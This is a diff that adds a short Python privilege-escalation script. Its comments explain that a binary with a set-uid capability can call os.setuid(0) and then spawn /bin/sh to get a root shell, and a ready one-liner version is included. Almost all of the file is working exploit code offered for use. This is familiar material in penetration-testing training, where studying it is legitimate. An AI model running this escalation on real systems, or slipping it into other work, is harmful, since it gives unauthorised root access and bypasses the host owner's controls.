@@ -1,0 +1,10 @@
+#This quick script, can be used when you have find a set uid capability on a system. The script will set the uid to "0" and get you a root shell
+"""Pythons os module lets us call system level functionality. For example dealing with processes, or the environment. 
+It will also let us call the setuid() function. This requires root permissions, which we can get through the capabilities (credit to 245ct by Dan Goldsmith)"""
+
+import os
+os.setuid(0)
+os.system('/bin/sh')
+
+
+#can also be used as a one-liner:  ./python3 -c "import os; os.setuid(0); os.system('/bin/sh')"
